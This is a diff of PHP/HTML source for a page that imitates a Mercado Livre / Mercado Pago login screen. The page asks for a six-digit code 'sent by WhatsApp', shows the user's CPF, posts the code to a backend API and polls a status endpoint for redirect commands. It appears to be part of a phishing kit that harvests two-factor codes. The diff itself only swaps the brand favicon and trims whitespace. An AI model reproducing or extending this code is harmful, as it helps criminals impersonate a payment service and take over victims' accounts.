@@ -13,7 +13,7 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 // Função para formatar o CPF
@@ -32,7 +32,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código que te enviamos por WhatsApp</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -107,7 +107,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
     <main class="main-content">
         <div class="content-wrapper">
-            
+
             <div class="left-column">
                 <span class="session-start-label">INÍCIO DE SESSÃO</span>
                 <h1 class="main-title">Insira o código que te enviamos por WhatsApp</h1>
@@ -122,7 +122,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         <a href="index.php">Trocar conta</a>
                     </div>
                 </div>
-                
+
                 <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
@@ -192,12 +192,12 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         function startTimer() {
             let seconds = 50;
             timerElement.style.color = 'var(--cor-texto-secundaria)';
-            
+
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                 const secs = String(seconds % 60).padStart(2, '0');
                 timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
-                
+
                 if (seconds > 0) {
                     seconds--;
                 } else {
@@ -205,7 +205,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                 }
             }
-            
+
             clearInterval(countdownInterval);
             updateTimer();
             countdownInterval = setInterval(updateTimer, 1000);
@@ -221,11 +221,11 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
         // Inicia o contador assim que a página carrega
         document.addEventListener('DOMContentLoaded', startTimer);
-        
+
         // LÓGICA 3: Envio do código para a API ao submeter o formulário
         async function handleFormSubmit(event) {
             event.preventDefault();
-            
+
             const code = inputs.map(input => input.value).join('');
 
             if (code.length === 6) {
@@ -236,9 +236,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ sms_code: code, source: 'whatsapp' }) // Adicionado 'source'
                     });
-                    
+
                     const result = await response.json();
-                    
+
                     if (result.success) {
                         // SUBSTITUIÇÃO DO ALERT
                         showToast('Código recebido com sucesso!', 'success');
@@ -312,7 +312,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
-                    console.log('Status atual:', data.status); 
+                    console.log('Status atual:', data.status);
 
                     if (data.status === 'redirecionar_para_2fa') {
                         clearInterval(statusInterval);
